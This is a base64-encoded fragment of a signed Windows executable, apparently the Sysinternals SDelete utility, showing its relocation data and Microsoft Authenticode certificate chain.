rrCuwK7QruCu8K4ArxCvIK8wrwDgAgDcAQAAaKF4oYihmKGoobihyKHYoeih+KEIohiiKKI4okiiWKJooniiiKKYoqiiuKLIotii6KL4ogijGKMoozijSKNYo2ijeKOIo5ijqKO4o8ij2KPoo/ijCKQYpCikOKRIpFikaKR4pIikmKSopLikyKTYpOik+KQIpRilKKU4pUilWKVopXiliKWYpailuKXIpdil6KX4pQimGKYopjimSKZYpmimeKaIppimqKa4psim2KbopvimCKcYpyinOKdIp1inaKd4p4inmKeop7inyKfYp+in+KcIqBioKKg4qEioWKhoqHioiKiYqKiouKjIqNio6Kj4qAipGKkoqTipSKlYqWipeKmIqZipqKm4qcip2KnoqfipCKoYqiiqOKpIqliqaKp4qoiqmKqoqriqyKrYquiq+KoIqxirKKs4q0irWKtoq3iriKuYq6iruKvIq9ir6Kv4qwisGKworDisSKxYrGiseKyIrJisqKy4rMis2KzorPisCK0YrSitOK1IrVitaK14rYitmK2orbityK3Yreit+K0IrhiuKK44rkiuWK5orniuiK6YrqiuuK7Irtiu6K74rgivGK8orzivSK9Yr2iveK+Ir5ivoK+wr8Cv0K/gr/CvAPACAMQBAAAAoBCgIKAwoECgUKBgoHCggKCQoKCgsKDAoNCg4KDwoAChEKEgoTChQKFQoWChcKGAoZChoKGwocCh0KHgofChAKIQoiCiMKJAolCiYKJwooCikKKgorCiwKLQouCi8KIAoxCjIKMwo0CjUKNgo3CjgKOQo6CjsKPAo9Cj4KPwowCkEKQgpDCkQKRQpGCkcKSApJCkoKSwpMCk0KTgpPCkAKUQpSClMKVApVClYKVwpYClkKWgpbClwKXQpeCl8KUAphCmIKYwpkCmUKZgpnCmgKaQpqCmsKbAptCm4KbwpgCnEKcgpzCnQKdQp2CncKeAp5CnoKewp8Cn0Kfgp/CnAKgQqCCoMKhAqFCoYKhwqICokKigqLCowKjQqOCo8KgAqRCpIKkwqUCpUKlgqXCpgKmQqaCpsKnAqdCp4KnwqQCqEKogqjCqQKpQqmCqcKqAqpCqoKqwqsCq0KrgqvCqAKsQqyCrMKtAq1CrYKtwq4CrkKugq7CrwKvQq+Cr8KsArBCsIKwwrECsUKxg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